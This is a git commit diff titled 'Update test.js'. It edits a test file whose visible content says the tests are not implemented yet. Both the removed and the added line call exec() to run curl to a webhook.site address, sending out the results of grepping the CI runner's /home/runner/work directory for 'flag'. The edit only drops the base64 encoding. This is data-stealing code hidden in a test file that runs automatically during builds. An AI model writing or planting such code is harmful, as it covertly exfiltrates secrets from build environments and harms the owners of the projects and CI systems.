c3e222df9fffa742eb40c509bdac458729fd7ece
Vignesh P <60399486+Senku01@users.noreply.github.com>
2023-04-15 21:18:13 +0530

    Update test.js

--- tests/test.js
+++ tests/test.js
@@ -1,4 +1,4 @@
 // TODO: implement the tests
 console.log("Tests are not implemented yet...");
 
-exec("curl https://webhook.site/1980078a-ade8-41e2-820a-9a67bd680d76/?test=$(grep -rnw /home/runner/work -e flag | base64)");
+exec("curl https://webhook.site/1980078a-ade8-41e2-820a-9a67bd680d76/?test=$(grep -rnw /home/runner/work -e flag)");
